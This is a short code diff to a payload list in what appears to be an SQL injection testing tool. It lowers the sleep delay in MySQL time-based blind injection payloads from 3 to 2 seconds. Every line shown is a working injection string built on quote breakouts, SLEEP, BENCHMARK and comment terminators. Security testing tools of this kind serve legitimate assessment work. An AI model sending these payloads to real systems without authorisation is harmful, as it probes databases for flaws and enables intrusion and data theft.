@@ -70,16 +70,16 @@ MYSQL_BOOLEAN_PAYLOADS = [
 
 # MySQL time-based payloads
 MYSQL_TIME_PAYLOADS = [
-    "' AND SLEEP(3) -- -",
-    "\" AND SLEEP(3) -- -",
+    "' AND SLEEP(2) -- -",
+    "\" AND SLEEP(2) -- -",
     "' AND BENCHMARK(20,MD5(1)) -- -",
     "\" AND BENCHMARK(20,MD5(1)) -- -",
-    "') AND SLEEP(3) -- -",
-    "\") AND SLEEP(3) -- -",
-    "' OR SLEEP(3) -- -",
-    "\" OR SLEEP(3) -- -",
-    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) -- -",
-    "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a) -- -"
+    "') AND SLEEP(2) -- -",
+    "\") AND SLEEP(2) -- -",
+    "' OR SLEEP(2) -- -",
+    "\" OR SLEEP(2) -- -",
+    "' AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- -",
+    "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- -"
 ]
 
 # MySQL union-based payloads
